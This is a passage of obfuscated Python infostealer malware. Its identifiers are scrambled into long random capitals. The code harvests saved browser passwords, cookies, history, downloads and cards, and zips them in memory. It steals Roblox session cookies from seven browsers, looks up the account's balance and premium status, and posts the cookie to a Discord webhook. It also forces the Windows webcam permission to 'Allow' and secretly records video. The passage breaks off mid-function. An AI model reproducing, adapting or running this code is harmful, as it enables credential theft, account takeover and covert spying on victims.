        DWVMAGDWHZZYZOYNGTXESWFQJRKPZBBHSUSQEJAVLVFCSQNOXLSZSVEUBROBDGD = ZFPVMANUTMOYTDDVMJTKENPILZFXGYPKDUIKLABQIPKMNJWTPYAESWQLDXDYA(os.path.join(VWEPPEFARLZNYGLSKXIZZLIISFSLAACGZZMPYHPCBETEOSPQORDVYIVKXZQUXJOFYVRHOSDLDRKBIHKIIUCEUFBD, 'Local State'))
        if not DWVMAGDWHZZYZOYNGTXESWFQJRKPZBBHSUSQEJAVLVFCSQNOXLSZSVEUBROBDGD:
            continue

        for v4r_profile in FMUCOFADZEDGJEQRLURSVGHWAJVDPVAUQIPUUZJGAFXTQESJTIZXTRWREHUXULVMWIQIV:
            QQPORZWDPYTKGXGWREVVONWMHPGVKUVNJTSSCWAHAOHSTUTVQPDQUWGNKIJIEMTRJMHPXLVP = os.path.join(VWEPPEFARLZNYGLSKXIZZLIISFSLAACGZZMPYHPCBETEOSPQORDVYIVKXZQUXJOFYVRHOSDLDRKBIHKIIUCEUFBD, v4r_profile)
            if not os.path.exists(QQPORZWDPYTKGXGWREVVONWMHPGVKUVNJTSSCWAHAOHSTUTVQPDQUWGNKIJIEMTRJMHPXLVP):
                continue
            
            try: XEBDSYSNOLBNSKYIZLKJDGRKXXVVEJSNSNPUGZJFRXSHBAMETATQSAMHDCKIBXTBEMKDHJQZWIZQYDCXUM(KNNWRAJLADNJEDMSBMZJPCPVVOBZPIAFWSMCUFODXRRHGDVYRBNXQNBUUZAIGDZOQGVLQEQOAPSHJAPANSTYYBKCZIDCFIJD, QQPORZWDPYTKGXGWREVVONWMHPGVKUVNJTSSCWAHAOHSTUTVQPDQUWGNKIJIEMTRJMHPXLVP, DWVMAGDWHZZYZOYNGTXESWFQJRKPZBBHSUSQEJAVLVFCSQNOXLSZSVEUBROBDGD)
            except: pass
            try: HZXFERUHLACBMGOUQJOIGEBUNXBIOWSTUGXIZZPUFWGUOXKQLQBOGQGFIOVIAOZFAFLSVLI(KNNWRAJLADNJEDMSBMZJPCPVVOBZPIAFWSMCUFODXRRHGDVYRBNXQNBUUZAIGDZOQGVLQEQOAPSHJAPANSTYYBKCZIDCFIJD, QQPORZWDPYTKGXGWREVVONWMHPGVKUVNJTSSCWAHAOHSTUTVQPDQUWGNKIJIEMTRJMHPXLVP, DWVMAGDWHZZYZOYNGTXESWFQJRKPZBBHSUSQEJAVLVFCSQNOXLSZSVEUBROBDGD)
            except: pass
            try: EBIOGKABKVKIVIMLKKINIDBKCFTMVFGMPUCGQKIHUQXLPTJMLA(KNNWRAJLADNJEDMSBMZJPCPVVOBZPIAFWSMCUFODXRRHGDVYRBNXQNBUUZAIGDZOQGVLQEQOAPSHJAPANSTYYBKCZIDCFIJD, QQPORZWDPYTKGXGWREVVONWMHPGVKUVNJTSSCWAHAOHSTUTVQPDQUWGNKIJIEMTRJMHPXLVP)
            except: pass
            try: CVRINKMXKZQRDIOTVEQZCZFWICDIWLUPYKSVKTKJJNKDUUKYBMKOJJRWDMWAETPFZNPHHCD(KNNWRAJLADNJEDMSBMZJPCPVVOBZPIAFWSMCUFODXRRHGDVYRBNXQNBUUZAIGDZOQGVLQEQOAPSHJAPANSTYYBKCZIDCFIJD, QQPORZWDPYTKGXGWREVVONWMHPGVKUVNJTSSCWAHAOHSTUTVQPDQUWGNKIJIEMTRJMHPXLVP)
            except: pass
            try: PLQWATDUKJTLQVDZJBIMEUKGPHODGYBQMTMMGXPDATXSWMWIKQNAKCDLXRXTNBQPDJRMWTQDLZGXPZSSKBBYYMHSMFTPNLXB(KNNWRAJLADNJEDMSBMZJPCPVVOBZPIAFWSMCUFODXRRHGDVYRBNXQNBUUZAIGDZOQGVLQEQOAPSHJAPANSTYYBKCZIDCFIJD, QQPORZWDPYTKGXGWREVVONWMHPGVKUVNJTSSCWAHAOHSTUTVQPDQUWGNKIJIEMTRJMHPXLVP, DWVMAGDWHZZYZOYNGTXESWFQJRKPZBBHSUSQEJAVLVFCSQNOXLSZSVEUBROBDGD)
            except: pass

            if KNNWRAJLADNJEDMSBMZJPCPVVOBZPIAFWSMCUFODXRRHGDVYRBNXQNBUUZAIGDZOQGVLQEQOAPSHJAPANSTYYBKCZIDCFIJD not in BYMKWZNUWYYMBUCCMKXQFSUFWXRWVTVSHDZEIMWVAOTEXJUAZRSQXMLXQXIOODD:
                BYMKWZNUWYYMBUCCMKXQFSUFWXRWVTVSHDZEIMWVAOTEXJUAZRSQXMLXQXIOODD.append(KNNWRAJLADNJEDMSBMZJPCPVVOBZPIAFWSMCUFODXRRHGDVYRBNXQNBUUZAIGDZOQGVLQEQOAPSHJAPANSTYYBKCZIDCFIJD)
            
    if not XHCLRQAILWGIQVLGNPQKFHVJKFXLISEEUEBXGJCXASLFYGFXHCKNUGAIEJXXVGTJIKMXJCV:
        XHCLRQAILWGIQVLGNPQKFHVJKFXLISEEUEBXGJCXASLFYGFXHCKNUGAIEJXXVGTJIKMXJCV.append("No passwords was saved on the victim's computer")
    if not RVZYPNNFNERFOKSZUIHULOAFKHENXOJAROJRYJUNHOIYZWOUMAZXFVEIMPMBJVSMMRXKJBFEN:
        RVZYPNNFNERFOKSZUIHULOAFKHENXOJAROJRYJUNHOIYZWOUMAZXFVEIMPMBJVSMMRXKJBFEN.append("No cookies was saved on the victim's computer")
    if not ISBAJIRRQTOHBMZVMRQNMQMUMMJRERKJYGHOBRDGZAYBYWDZSCAOFHWHOMUNBCHGQFIXTVNJNKKCL:
        ISBAJIRRQTOHBMZVMRQNMQMUMMJRERKJYGHOBRDGZAYBYWDZSCAOFHWHOMUNBCHGQFIXTVNJNKKCL.append("No history was saved on the victim's computer")
    if not FDAXYAKMOYRXMMRDSWWVACCIZIVCWQWRVEROHNYKRLLBBIMIBZBXGWTURHJCPMMMJPPPOFS:
        FDAXYAKMOYRXMMRDSWWVACCIZIVCWQWRVEROHNYKRLLBBIMIBZBXGWTURHJCPMMMJPPPOFS.append("No downloads was saved on the victim's computer")
    if not STZNNIPQGKSYWJCRFONTKTNSDCGQMLYYXLBUAIWMDAIWHCWCZRMCZUIJDGIIRMTXAOGEPLQRTFTSDEQKXHKKU:
        STZNNIPQGKSYWJCRFONTKTNSDCGQMLYYXLBUAIWMDAIWHCWCZRMCZUIJDGIIRMTXAOGEPLQRTFTSDEQKXHKKU.append("No card was saved on the victim's computer")

    zip_in_memory = EKSNXEYTMIVNJEUCLDGJLCUBAIXDXJQLTSBOZIQKIRIUOFVHIYQJ(IGGQEJLCJEPBNULVOGOEMHPSIDCFUPXIVMWYOBYJTNQUXSWJPQBVHOQENIFMPHQPAIMRKVQODFUTMUSUEFKJIPYUB)
    GXXSJALNMUFVUQUYOXXMBWQOXTVGLOGDWLWLHHWQXBKJZTWTCPMBFGUMOPTWXDUITMTAPJPQFBTGCHQDMWNHIOZRESFVMKV(IGGQEJLCJEPBNULVOGOEMHPSIDCFUPXIVMWYOBYJTNQUXSWJPQBVHOQENIFMPHQPAIMRKVQODFUTMUSUEFKJIPYUB, zip_in_memory)

def XLWFUSFBDRBLHBIEVCARNTOODYDJOBDBDJGTFMMDECRJIAABZOTSYCZIPZQUYRCJSFAVIYHFNMEYNR():
    import browser_cookie3
    import requests
    import json
    from discord import SyncWebhook
    import discord

    VRIACWTHACJUGKVSVRAHHEFFARNZVDMUPJFQBWFZLMZGTPRZEOVLUUSCKYBNYJJAUTJVJFWQJ = []
    def UFYNUSLBCZJIJXTOLYNRDOYUXJMBIBRUFMJGQZAKAGQYNCRKIENSAVUDHYHCBRDLOOBLMZRATTDFBMZHFUVADKHQUWMTPEELMVGB(PLSPAQLFIWKBYSETQUCPKWJDVZBFEEDUQXDOICGFFXXVLGACSAMMIWHJHVHZRTQOH):
        try:
            HRQRIBMWXMIEDNODCXVRKTMDSCHUWTRDGEZXUXFSGEOZVGPXMIJFNPPWV = PLSPAQLFIWKBYSETQUCPKWJDVZBFEEDUQXDOICGFFXXVLGACSAMMIWHJHVHZRTQOH()
            HRQRIBMWXMIEDNODCXVRKTMDSCHUWTRDGEZXUXFSGEOZVGPXMIJFNPPWV = str(HRQRIBMWXMIEDNODCXVRKTMDSCHUWTRDGEZXUXFSGEOZVGPXMIJFNPPWV)
            ZQRFACDCNXFWBZUZVASJMNKKCROEIPIWWCHZSZJYCFPKYNJNLOKPBAWDWETEDOTKDWIQCPAPSHPUT = HRQRIBMWXMIEDNODCXVRKTMDSCHUWTRDGEZXUXFSGEOZVGPXMIJFNPPWV.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
            RAEJFHEAMXCQQLZNIBEPHPPSYUDDXADLVDJBKBJTJNLMPYIHCJMHALGQXLLU = PLSPAQLFIWKBYSETQUCPKWJDVZBFEEDUQXDOICGFFXXVLGACSAMMIWHJHVHZRTQOH.__name__
            return ZQRFACDCNXFWBZUZVASJMNKKCROEIPIWWCHZSZJYCFPKYNJNLOKPBAWDWETEDOTKDWIQCPAPSHPUT, RAEJFHEAMXCQQLZNIBEPHPPSYUDDXADLVDJBKBJTJNLMPYIHCJMHALGQXLLU
        except:
            return None, None

    def YAQPEZPNKQOHYTQDIYLKHTWBKDBJAQGPCFNJTCLUOGVRZTGJBTHCCRHUMRAUMICYONCSJJVNP():
        return browser_cookie3.edge(domain_name="roblox.com")

    def DVLYDINMPMDRGNWFQVSKGGMVMODTFEOEIBWJSGGFWDRDRKAUZUORTSYFCF():
        return browser_cookie3.chrome(domain_name="roblox.com")

    def MOBFXKVGXULTEWDCWLNFHPGFUXLKOGNXRPADECVCPKQGZUOWEQMSFZT():
        return browser_cookie3.firefox(domain_name="roblox.com")

    def SORSXWFSCJQTGWDSCOBSOEXWXBKSGZKBKXGKETHZRNFUUFIGUJITZHCMDZRGWEHHMVCPLXOGXBAVF():
        return browser_cookie3.opera(domain_name="roblox.com")
    
    def SORSXWFSCJQTGWDSCOBSOEXWXBKSGZKBKXGKETHZRNFUUFIGUJITZHCMDZRGWEHHMVCPLXOGXBAVFGX():
        return browser_cookie3.opera_gx(domain_name="roblox.com")

    def OXRVIDKDSHSJGLXTEVQMMLXLCQZOTNTFQWGPVAVDNEXQUKQWXP():
        return browser_cookie3.safari(domain_name="roblox.com")

    def QWIKZJWXXBJVAXPFPJQHZYZNWFZTCKBEIUIMMOCSRLYWKGBBMACHCNEHLEPZN():
        return browser_cookie3.brave(domain_name="roblox.com")

    WNEAGSLURSLMTWHEFPZQNNFAFGXVKMXPQJYHEDAZXUZHXWJTDREMOMSOQSMZOCKGMKRTEJKXFSVLCVDLLE = [YAQPEZPNKQOHYTQDIYLKHTWBKDBJAQGPCFNJTCLUOGVRZTGJBTHCCRHUMRAUMICYONCSJJVNP, DVLYDINMPMDRGNWFQVSKGGMVMODTFEOEIBWJSGGFWDRDRKAUZUORTSYFCF, MOBFXKVGXULTEWDCWLNFHPGFUXLKOGNXRPADECVCPKQGZUOWEQMSFZT, SORSXWFSCJQTGWDSCOBSOEXWXBKSGZKBKXGKETHZRNFUUFIGUJITZHCMDZRGWEHHMVCPLXOGXBAVF, SORSXWFSCJQTGWDSCOBSOEXWXBKSGZKBKXGKETHZRNFUUFIGUJITZHCMDZRGWEHHMVCPLXOGXBAVFGX, OXRVIDKDSHSJGLXTEVQMMLXLCQZOTNTFQWGPVAVDNEXQUKQWXP, QWIKZJWXXBJVAXPFPJQHZYZNWFZTCKBEIUIMMOCSRLYWKGBBMACHCNEHLEPZN]
    for v4r_br0ws3r in WNEAGSLURSLMTWHEFPZQNNFAFGXVKMXPQJYHEDAZXUZHXWJTDREMOMSOQSMZOCKGMKRTEJKXFSVLCVDLLE:
        v4r_c00ki3, RAEJFHEAMXCQQLZNIBEPHPPSYUDDXADLVDJBKBJTJNLMPYIHCJMHALGQXLLU = UFYNUSLBCZJIJXTOLYNRDOYUXJMBIBRUFMJGQZAKAGQYNCRKIENSAVUDHYHCBRDLOOBLMZRATTDFBMZHFUVADKHQUWMTPEELMVGB(v4r_br0ws3r)
        if v4r_c00ki3:
            if v4r_c00ki3 not in VRIACWTHACJUGKVSVRAHHEFFARNZVDMUPJFQBWFZLMZGTPRZEOVLUUSCKYBNYJJAUTJVJFWQJ:
                VRIACWTHACJUGKVSVRAHHEFFARNZVDMUPJFQBWFZLMZGTPRZEOVLUUSCKYBNYJJAUTJVJFWQJ.append(v4r_c00ki3)
                try:
                    CKRLASONUUYENQCKPEIWZAYNVQUEPUMABEAIEIETKIZYWEAGROLGKAPBUDJQXWILAEESDJWMLBPUTPWMSECQHPMWUTM = requests.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": v4r_c00ki3})
                    ZGZSDJERGIOFKCTOHUPGAHALCAVTGMPRQGDZZIHTAUTQYYOJDKQNQJIMUR = json.loads(CKRLASONUUYENQCKPEIWZAYNVQUEPUMABEAIEIETKIZYWEAGROLGKAPBUDJQXWILAEESDJWMLBPUTPWMSECQHPMWUTM.text)
                except:
                    pass

                GJDXAVAVOLDHRJISGLQKYDJGQHDJXUSQAQUQHJVMGYQSZJGHIXCYCYYZPRLQWUDRHJFSOFETBWNIQIFMBJFTI = ZGZSDJERGIOFKCTOHUPGAHALCAVTGMPRQGDZZIHTAUTQYYOJDKQNQJIMUR.get('id', "None")
                VUULXGTHBBGPJDZZTQNIGFTQLPMLUDNRHPVTHXRIZSWSGXRQUSNSBESVSNOHSIMCULWXKXPPMAKDILOKANBHXUB = ZGZSDJERGIOFKCTOHUPGAHALCAVTGMPRQGDZZIHTAUTQYYOJDKQNQJIMUR.get('displayName', "None")
                XZIBIHNHYAQBOUKXGLEVTGEHNUQAFHKDQSODAKDLSDQOWDPJVYHJGUKYNJWZTJZLGAQSISOSKFAY = ZGZSDJERGIOFKCTOHUPGAHALCAVTGMPRQGDZZIHTAUTQYYOJDKQNQJIMUR.get('name', "None")
                HQSIGFPIMCNOJVUPGPZISYKVBQAZLXSJSZBDRNMRQKXBNAWFWJVXSXYXCHODPSQDMODHLKYO = ZGZSDJERGIOFKCTOHUPGAHALCAVTGMPRQGDZZIHTAUTQYYOJDKQNQJIMUR.get("RobuxBalance", "None")
                URMTLJVFJLHWLMQBVFSAGRIUKZOXRMUGDAKAWBRQWNNEUKZGAJIYEAMIJHPZDOWCM = ZGZSDJERGIOFKCTOHUPGAHALCAVTGMPRQGDZZIHTAUTQYYOJDKQNQJIMUR.get("IsPremium", "None")
                KBUDXBEHWHCQBJJUNVTEMBWBTDTFTZODECGKMWJVBOGHSBTTYQYSYVPJCTRVQJXTBVWYTWCHS = ZGZSDJERGIOFKCTOHUPGAHALCAVTGMPRQGDZZIHTAUTQYYOJDKQNQJIMUR.get("ThumbnailUrl", "None")
                XWELBMZLYXPHWXJUKUYPZISCQAFYXPMVXEZYPQCRDHJMWMCPKFAOSTYLZGZAYDLMSAASXCZCCASHCKKTNJRTFTLXBHRUSXJEXM = ZGZSDJERGIOFKCTOHUPGAHALCAVTGMPRQGDZZIHTAUTQYYOJDKQNQJIMUR.get("IsAnyBuildersClubMember", "None")
        
                RXLUERAINGNFXVCCRMNWCJDMQLWQYHMTMNQSOLAFTDANABDWKUYOOZVQSTWFSP = len(v4r_c00ki3)
                YLEHUSDJOREEABQEMRONULTSGPWAKZMNOGMGTCWVYONJBUSWBJJCWFMWBTXICQVCQZUSVHGTBRWET = RXLUERAINGNFXVCCRMNWCJDMQLWQYHMTMNQSOLAFTDANABDWKUYOOZVQSTWFSP // 2
                NCABYJVCTJACCNOGRHHJYZGGHOLDUYXXWBCPCXHCIQHONARKGPUGWVYUXOFIAOYSQLXTASRKJJYDNLSOKGHVDSVXMOAJFZJEPD = v4r_c00ki3[:YLEHUSDJOREEABQEMRONULTSGPWAKZMNOGMGTCWVYONJBUSWBJJCWFMWBTXICQVCQZUSVHGTBRWET]
                AEZBYZJHMZAFSWCBUCFQZXQTSPWBDSQBGTAPSNJIMZDOVASCWMVJ = v4r_c00ki3[YLEHUSDJOREEABQEMRONULTSGPWAKZMNOGMGTCWVYONJBUSWBJJCWFMWBTXICQVCQZUSVHGTBRWET:]

                OQVNJZGZEZGGYFVTIJBUPKNPLVEYQAUXNKDLUSMNVSEEKXEOCZSHNSAEER = SyncWebhook.from_url(TEHMBLJHQXYXUPCCHKGUDBCDWFKUIKCYCOMQFIVNEIBLJZWCQIYFBZ)

                RDBJHCCKZOEVBKQLJTHHIFJGWHDDBFOMKVGMKZCBOKAQASHRPBYZJBJCJMQMZNNXVULGRDXUJFNBNRTYNBVWLLMPGIA = discord.Embed(
                    title=f'Roblox Cookie {JVQTLDADTYXKYZHMXTKHPNYLFIGLMMMLYWLGZYSTPVADECBDSENXNOQZXQKIRPEMBYFMICHEXRUQRVVCYKIJKDAZ}:',
                    color=UZWWSUMHOOULCLVGSESALXIRPLUVNUMSHAYWLKTQUQPYJKZZAJTLG
                )
                RDBJHCCKZOEVBKQLJTHHIFJGWHDDBFOMKVGMKZCBOKAQASHRPBYZJBJCJMQMZNNXVULGRDXUJFNBNRTYNBVWLLMPGIA.set_footer(text=ZEGRRDVSQIYWYKBGRMSNAHPPITRVDSABIATRSVBWNGINWGLPWBTONTBGLGWGSCKWTLLBAIKBDJLFYYWRXG, icon_url=CBYRGELXUIKPDUYMNSQBQLNDULQQYOPBNPSOXFDVQPHZFNRXGATNHUGJSNOMFDGYHBVMQGSKZJENFVSZTZXQCZZSW)
                RDBJHCCKZOEVBKQLJTHHIFJGWHDDBFOMKVGMKZCBOKAQASHRPBYZJBJCJMQMZNNXVULGRDXUJFNBNRTYNBVWLLMPGIA.set_thumbnail(url=KBUDXBEHWHCQBJJUNVTEMBWBTDTFTZODECGKMWJVBOGHSBTTYQYSYVPJCTRVQJXTBVWYTWCHS)
                RDBJHCCKZOEVBKQLJTHHIFJGWHDDBFOMKVGMKZCBOKAQASHRPBYZJBJCJMQMZNNXVULGRDXUJFNBNRTYNBVWLLMPGIA.add_field(name=":compass: Navigator:", value=f"```{RAEJFHEAMXCQQLZNIBEPHPPSYUDDXADLVDJBKBJTJNLMPYIHCJMHALGQXLLU}```", inline=True)
                RDBJHCCKZOEVBKQLJTHHIFJGWHDDBFOMKVGMKZCBOKAQASHRPBYZJBJCJMQMZNNXVULGRDXUJFNBNRTYNBVWLLMPGIA.add_field(name=":bust_in_silhouette: Username:", value=f"```{XZIBIHNHYAQBOUKXGLEVTGEHNUQAFHKDQSODAKDLSDQOWDPJVYHJGUKYNJWZTJZLGAQSISOSKFAY}```", inline=True)
                RDBJHCCKZOEVBKQLJTHHIFJGWHDDBFOMKVGMKZCBOKAQASHRPBYZJBJCJMQMZNNXVULGRDXUJFNBNRTYNBVWLLMPGIA.add_field(name=":bust_in_silhouette: DisplayName:", value=f"```{VUULXGTHBBGPJDZZTQNIGFTQLPMLUDNRHPVTHXRIZSWSGXRQUSNSBESVSNOHSIMCULWXKXPPMAKDILOKANBHXUB}```", inline=True)
                RDBJHCCKZOEVBKQLJTHHIFJGWHDDBFOMKVGMKZCBOKAQASHRPBYZJBJCJMQMZNNXVULGRDXUJFNBNRTYNBVWLLMPGIA.add_field(name=":robot: Id:", value=f"```{GJDXAVAVOLDHRJISGLQKYDJGQHDJXUSQAQUQHJVMGYQSZJGHIXCYCYYZPRLQWUDRHJFSOFETBWNIQIFMBJFTI}```", inline=True)
                RDBJHCCKZOEVBKQLJTHHIFJGWHDDBFOMKVGMKZCBOKAQASHRPBYZJBJCJMQMZNNXVULGRDXUJFNBNRTYNBVWLLMPGIA.add_field(name=":moneybag: Robux:", value=f"```{HQSIGFPIMCNOJVUPGPZISYKVBQAZLXSJSZBDRNMRQKXBNAWFWJVXSXYXCHODPSQDMODHLKYO}```", inline=True)
                RDBJHCCKZOEVBKQLJTHHIFJGWHDDBFOMKVGMKZCBOKAQASHRPBYZJBJCJMQMZNNXVULGRDXUJFNBNRTYNBVWLLMPGIA.add_field(name=":tickets: Premium:", value=f"```{URMTLJVFJLHWLMQBVFSAGRIUKZOXRMUGDAKAWBRQWNNEUKZGAJIYEAMIJHPZDOWCM}```", inline=True)
                RDBJHCCKZOEVBKQLJTHHIFJGWHDDBFOMKVGMKZCBOKAQASHRPBYZJBJCJMQMZNNXVULGRDXUJFNBNRTYNBVWLLMPGIA.add_field(name=":construction_site: Builders Club:", value=f"```{XWELBMZLYXPHWXJUKUYPZISCQAFYXPMVXEZYPQCRDHJMWMCPKFAOSTYLZGZAYDLMSAASXCZCCASHCKKTNJRTFTLXBHRUSXJEXM}```", inline=True)
                RDBJHCCKZOEVBKQLJTHHIFJGWHDDBFOMKVGMKZCBOKAQASHRPBYZJBJCJMQMZNNXVULGRDXUJFNBNRTYNBVWLLMPGIA.add_field(name=":cookie: Cookie Part 1:", value=f"```{NCABYJVCTJACCNOGRHHJYZGGHOLDUYXXWBCPCXHCIQHONARKGPUGWVYUXOFIAOYSQLXTASRKJJYDNLSOKGHVDSVXMOAJFZJEPD}```", inline=False)
                RDBJHCCKZOEVBKQLJTHHIFJGWHDDBFOMKVGMKZCBOKAQASHRPBYZJBJCJMQMZNNXVULGRDXUJFNBNRTYNBVWLLMPGIA.add_field(name=":cookie: Cookie Part 2:", value=f"```{AEZBYZJHMZAFSWCBUCFQZXQTSPWBDSQBGTAPSNJIMZDOVASCWMVJ}```", inline=False)

                OQVNJZGZEZGGYFVTIJBUPKNPLVEYQAUXNKDLUSMNVSEEKXEOCZSHNSAEER.send(embed=RDBJHCCKZOEVBKQLJTHHIFJGWHDDBFOMKVGMKZCBOKAQASHRPBYZJBJCJMQMZNNXVULGRDXUJFNBNRTYNBVWLLMPGIA, username=PDHSHFGMMAJVSNBRHNDWCMJWDPOAITBFFSIMKXJQVHZPDCZGEONVALVPYKGUJGGNZXNHODXU,
                                avatar_url=CBYRGELXUIKPDUYMNSQBQLNDULQQYOPBNPSOXFDVQPHZFNRXGATNHUGJSNOMFDGYHBVMQGSKZJENFVSZTZXQCZZSW)
                
    if not VRIACWTHACJUGKVSVRAHHEFFARNZVDMUPJFQBWFZLMZGTPRZEOVLUUSCKYBNYJJAUTJVJFWQJ:
        JYLFFAWPSFKUCMZGZDMJIKLJPPXWGRLMRITBULMBHCPESHWOZCRMKXLPLLFWNZRAMJAEBLLHQA(
            TEHMBLJHQXYXUPCCHKGUDBCDWFKUIKCYCOMQFIVNEIBLJZWCQIYFBZ, 
            title=f'Roblox Cookie {JVQTLDADTYXKYZHMXTKHPNYLFIGLMMMLYWLGZYSTPVADECBDSENXNOQZXQKIRPEMBYFMICHEXRUQRVVCYKIJKDAZ}:', 
            description=f"No roblox cookie found."
        )

def MPXODCDRBHBTESRSGUCAQWQRNZENARTCTGPLLSLEKVHHNVGKRNYBAMZHNJEMZOUWDW():
    import os
    import cv2
    from discord import SyncWebhook, Embed, File
    from datetime import datetime
    import winreg
    from datetime import datetime

    try:
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore" + r'\webcam', 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, 'Value', 0, winreg.REG_SZ, 'Allow')
            winreg.CloseKey(key)
        except: pass
        EXGHRMLUQQZSSURRTUCPXSPCKGQFZGSCLHANUTCRANHQOCAHLWQREMWLPRILHZUJNHQCIVVZZOFGARZFPVL_file_capture = f"CameraCapture_{IGGQEJLCJEPBNULVOGOEMHPSIDCFUPXIVMWYOBYJTNQUXSWJPQBVHOQENIFMPHQPAIMRKVQODFUTMUSUEFKJIPYUB}.avi"

        def C4ptur3(VWEPPEFARLZNYGLSKXIZZLIISFSLAACGZZMPYHPCBETEOSPQORDVYIVKXZQUXJOFYVRHOSDLDRKBIHKIIUCEUFBD_file_capture):
            CVLWZKYBAESBPCBVMGYCWJFEBWWRCVQXRJTDPEVRCSSTXDBZRTCJLITGRNBFWUKVYJDZZGGRTXNMDDYVSEFNVAETRCIVPPWNGSHD_capture = 15
            OYUMZDKEIOPFLEKKPLVKTULBNSTWJUOIRRWDGGNCTPRWSDQXSBSSFEIUNVMCFZQTOQQUXLHARXCDSGEBHCCYEHVCPVTDW = cv2.VideoCapture(0)

            if not OYUMZDKEIOPFLEKKPLVKTULBNSTWJUOIRRWDGGNCTPRWSDQXSBSSFEIUNVMCFZQTOQQUXLHARXCDSGEBHCCYEHVCPVTDW.isOpened():
                YHNUJQMVCZPFKEKAFUBGHUGVJQHIVFMSGKEUFUPVVSMTWBHZSEBJJZMEGWVQDSZWWHYWFTAJTAYD()
                JYLFFAWPSFKUCMZGZDMJIKLJPPXWGRLMRITBULMBHCPESHWOZCRMKXLPLLFWNZRAMJAEBLLHQA(
                    TEHMBLJHQXYXUPCCHKGUDBCDWFKUIKCYCOMQFIVNEIBLJZWCQIYFBZ, 
                    title=f'Camera Capture {IGGQEJLCJEPBNULVOGOEMHPSIDCFUPXIVMWYOBYJTNQUXSWJPQBVHOQENIFMPHQPAIMRKVQODFUTMUSUEFKJIPYUB} "{TCMWHHLJKFTYETTJNQXBNATMYKDVVZWZFMSOMPDZMIKTDSGSWCJDQIJ}":', 
                    description=f"No cameras found."
                )
                status = "exit"
                return status
            
            VHOOQFUNFSBZOTUIPZHBPWJZWNPOWOTUGPMTGLOLSGEQKQOLERDXBWO = cv2.VideoWriter_fourcc(*'XVID')
            XRDZMREIPAMTYYZBFUFVZFKOLMTIYNWFUOMQUUGDVDRMOPJOSYYVRTEBFGRKZFGNUXMELNWIZCSGTOPHSDGLKURY = cv2.VideoWriter(VWEPPEFARLZNYGLSKXIZZLIISFSLAACGZZMPYHPCBETEOSPQORDVYIVKXZQUXJOFYVRHOSDLDRKBIHKIIUCEUFBD_file_capture, VHOOQFUNFSBZOTUIPZHBPWJZWNPOWOTUGPMTGLOLSGEQKQOLERDXBWO, 20.0, (640, 480))
            CVLWZKYBAESBPCBVMGYCWJFEBWWRCVQXRJTDPEVRCSSTXDBZRTCJLITGRNBFWUKVYJDZZGGRTXNMDDYVSEFNVAETRCIVPPWNGSHD_start = datetime.now()
            while (datetime.now() - CVLWZKYBAESBPCBVMGYCWJFEBWWRCVQXRJTDPEVRCSSTXDBZRTCJLITGRNBFWUKVYJDZZGGRTXNMDDYVSEFNVAETRCIVPPWNGSHD_start).seconds < CVLWZKYBAESBPCBVMGYCWJFEBWWRCVQXRJTDPEVRCSSTXDBZRTCJLITGRNBFWUKVYJDZZGGRTXNMDDYVSEFNVAETRCIVPPWNGSHD_capture:
                v4r_ret, v4r_frame = OYUMZDKEIOPFLEKKPLVKTULBNSTWJUOIRRWDGGNCTPRWSDQXSBSSFEIUNVMCFZQTOQQUXLHARXCDSGEBHCCYEHVCPVTDW.read()
                if not v4r_ret:
                    break
                XRDZMREIPAMTYYZBFUFVZFKOLMTIYNWFUOMQUUGDVDRMOPJOSYYVRTEBFGRKZFGNUXMELNWIZCSGTOPHSDGLKURY.write(v4r_frame)

            OYUMZDKEIOPFLEKKPLVKTULBNSTWJUOIRRWDGGNCTPRWSDQXSBSSFEIUNVMCFZQTOQQUXLHARXCDSGEBHCCYEHVCPVTDW.release()
            XRDZMREIPAMTYYZBFUFVZFKOLMTIYNWFUOMQUUGDVDRMOPJOSYYVRTEBFGRKZFGNUXMELNWIZCSGTOPHSDGLKURY.release()
            status = None
            
            return status

        try:
            VWEPPEFARLZNYGLSKXIZZLIISFSLAACGZZMPYHPCBETEOSPQORDVYIVKXZQUXJOFYVRHOSDLDRKBIHKIIUCEUFBD_file_capture = os.path.join(BFACSUNBBCFFJETEOYNORLZIXPIDYLHLMLCCODAKCMDXMXZSUZNWSN, 'Documents', EXGHRMLUQQZSSURRTUCPXSPCKGQFZGSCLHANUTCRANHQOCAHLWQREMWLPRILHZUJNHQCIVVZZOFGARZFPVL_file_capture)
            status = C4ptur3(VWEPPEFARLZNYGLSKXIZZLIISFSLAACGZZMPYHPCBETEOSPQORDVYIVKXZQUXJOFYVRHOSDLDRKBIHKIIUCEUFBD_file_capture)
        except:
            VWEPPEFARLZNYGLSKXIZZLIISFSLAACGZZMPYHPCBETEOSPQORDVYIVKXZQUXJOFYVRHOSDLDRKBIHKIIUCEUFBD_file_capture = EXGHRMLUQQZSSURRTUCPXSPCKGQFZGSCLHANUTCRANHQOCAHLWQREMWLPRILHZUJNHQCIVVZZOFGARZFPVL_file_capture
            status = C4ptur3(VWEPPEFARLZNYGLSKXIZZLIISFSLAACGZZMPYHPCBETEOSPQORDVYIVKXZQUXJOFYVRHOSDLDRKBIHKIIUCEUFBD_file_capture)
        
        if status == "exit":
            return

        RDBJHCCKZOEVBKQLJTHHIFJGWHDDBFOMKVGMKZCBOKAQASHRPBYZJBJCJMQMZNNXVULGRDXUJFNBNRTYNBVWLLMPGIA = Embed(title=f"Camera Capture {JVQTLDADTYXKYZHMXTKHPNYLFIGLMMMLYWLGZYSTPVADECBDSENXNOQZXQKIRPEMBYFMICHEXRUQRVVCYKIJKDAZ}:", color=UZWWSUMHOOULCLVGSESALXIRPLUVNUMSHAYWLKTQUQPYJKZZAJTLG, description=f"```└── 📷 - {EXGHRMLUQQZSSURRTUCPXSPCKGQFZGSCLHANUTCRANHQOCAHLWQREMWLPRILHZUJNHQCIVVZZOFGARZFPVL_file_capture}```")
        RDBJHCCKZOEVBKQLJTHHIFJGWHDDBFOMKVGMKZCBOKAQASHRPBYZJBJCJMQMZNNXVULGRDXUJFNBNRTYNBVWLLMPGIA.set_footer(text=ZEGRRDVSQIYWYKBGRMSNAHPPITRVDSABIATRSVBWNGINWGLPWBTONTBGLGWGSCKWTLLBAIKBDJLFYYWRXG, icon_url=CBYRGELXUIKPDUYMNSQBQLNDULQQYOPBNPSOXFDVQPHZFNRXGATNHUGJSNOMFDGYHBVMQGSKZJENFVSZTZXQCZZSW)

